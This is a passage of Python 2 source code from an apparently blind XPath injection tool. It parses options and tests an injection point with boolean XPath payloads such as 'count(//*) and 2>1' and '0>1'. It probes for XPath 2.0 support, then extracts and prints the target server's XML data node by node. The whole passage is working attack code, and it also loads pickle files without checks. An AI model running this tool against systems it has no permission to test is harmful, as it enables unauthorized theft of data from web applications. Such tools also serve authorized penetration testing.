	group_adv.add_argument("--search", help="Print all string matches (use -l for case-insensitive)", dest="search", metavar='STRING')
	group_adv.add_argument("--search_start", help="Search only at start of node", dest="search_start", action="store_true", default=False)

	try:
		args = parser.parse_args()
	except IOError as e:
		sys.stderr.write("Error: Cannot access injection file: %s\n" % e)
		exit(2)
	except Exception as e:
		parser.error("Error: Invalid command arguments: %s\n" % e)
		exit(1)
	args.inject_file = args.inject_file.read() # Convert file object to string
	if args.len_low > args.len_high or args.len_low == args.len_high:
		parser.error("Invalid character length matching parameters. Must be set as %i >= %i:" % (args.len_low, args.len_high))
		exit(1)
	#if args.trie_delim is not None and args.trie_pickle is None:
	#	parser.error("--trie-delim requires a filename to be given, use -d")
	#	exit(1)
		

	if not re.search('\$INJECT', args.inject_file):
		sys.stderr.write("### Error: Could not find '$INJECT' string in provided content: ###\n%s" % args.inject_file)
		exit(3)
	if args.use_lowercase:
		for r in string.uppercase: args.character_set = args.character_set.replace(r, '')
	if args.port is None:
		args.port = 443 if args.use_ssl else 80
	if args.example:
		print "### Testing %s ###" % args.example
		args.no_child = True
		attack(encode_payload(args.example))
		exit(0)
	# Test injection point for successful injection before performing attack
	if not attack(encode_payload("count(//*) and 2>1")):
		sys.stderr.write("### Test Injection Failed to match '%s' using: ###\n%s\n" % (args.match, args.inject_file))
		sys.stderr.write("### If you know injection location is correct, please examine use of -U and -H flags###\n")
		exit(3)
	# Verify that bad injection is not accepted
	if attack(encode_payload("0>1")):
		sys.stderr.write("### Matched '%s' using invalid XPath request on:###\n%s\n" % (args.match, args.inject_file))
		sys.stderr.write("### If you know injection location is correct, please examine use of -U and -H flags###\n")
		exit(3)
	# Test for XPath 2.0 functionality
	if args.xpath2:
		if attack(encode_payload("lower-case('A')='a'")):
			sys.stderr.write("### Looks like %s:%i supports XPath 2.0 injection via lower-case(), consider using xcat (https://github.com/orf/xcat) ###\n" % (args.host, args.port))
			exit(3)
	if args.unicode:
		# Some editors will complain about the Unicode string below.. use a better editor
		unicode_str = u"ÀÁÂÃÄÅÆÇÈÉÊËÌÍÎÏÐÑÒÓÔÕÖ×ØÙÚÛÜÝÞßàáâãäåæçèéêëìíîïðñòóôõö÷øùúûüýþÿ"
		sys.stdout.write("### Adding %i Unicode characters to character set of length %i ###\n" % (len(unicode_str), len(args.character_set)))
		args.character_set += unicode_str
	if args.optimize_charset:
		args.character_set = xml_optimize_character_set(args.character_set)
	# Eliminate duplicates in our set
	args.character_set = ''.join(set((args.character_set)))

	# Build trie for predictive text
	trie_root = None
	if args.trie_pickle is not None:
		try:
			f = open(args.trie_pickle, 'r')
		except IOError as e:
			sys.stderr.write("Error: Cannot access '%s': %s\n" % (args.trie_pickle, e))
			exit(2)
		trie_root = pickle.loads(f.read())
		f.close()
	elif args.trie_dic is not None:
		try:
			trie_root = trie.build_trie(args.trie_dic, args.trie_delim)
		except IOError as e:
			sys.stderr.write("Error: Cannot access '%s': %s\n" % (args.trie_dic, e))
			exit(2)
		except IndexError as e:
			sys.stderr.write("Error: Dictionary has the only one column, check delimiter: %s\n" % e)
			exit(3)
		if args.trie_pickle is None:
			args.trie_pickle = args.trie_dic + '.pickle'
		try:
			f = open(args.trie_pickle, 'wb')
		except IOError as e:
			sys.stderr.write("Error: Cannot write to '%s': %s\n" % (args.trie_pickle, e))
			exit(2)
		f.write(pickle.dumps(trie_root))
		f.close()
	#else:
	#    trie_root = trie.Trie() # no predictions

	# Start threads
	#thread_lst = []
	#for i in range(args.threads):
	#	t = threading.Thread(target=get_character_queue, args = (QI, QO))
	#	t.daemon = True
	#	t.start()
	#	thread_lst.append(t)

	if args.search:
		print "### Searching globally for %s ###" % args.search
		xml_search(args.search)
		exit(0)

	# Start our XML Content with an empty string
	if not args.summary:
		print "\n### Raw XML ####:"
	xml_content = ''
	xml_content += get_xml_details()

	if not args.summary:
		xml_content += get_xml_bst(args.start_node)
		xml_content = str(xml_content.encode('latin1'))
		print "\n\n### Parsed XML ####:"
		try:
			# Warning The xml.dom.minidom module is not secure against maliciously constructed data.
			# This parses improperly in either Windows or Linux. I'm not dealing with encoding issues in Python
			print xml.dom.minidom.parseString(xml_content).toprettyxml(encoding='utf-8')
		except xml.parsers.expat.ExpatError as e:
			sys.stderr.write("### Unable to process as complete XML document '%s', re-printing raw XML###\n" % e)
			print xml_content

		if args.global_count:
			print "### XML Elements Remaining: Nodes: %i, Attributes: %i, Comments: %i, Instructions: %i, Text: %i ###" % (nodes_total, attributes_total, comments_total, instructions_total, text_total)

	t2 = time.time()
	sys.stderr.write("### %i requests made in %.2f seconds (%.2f req/sec) ###\n"% (REQUEST_COUNT, (t2-t1), REQUEST_COUNT/(t2-t1)))


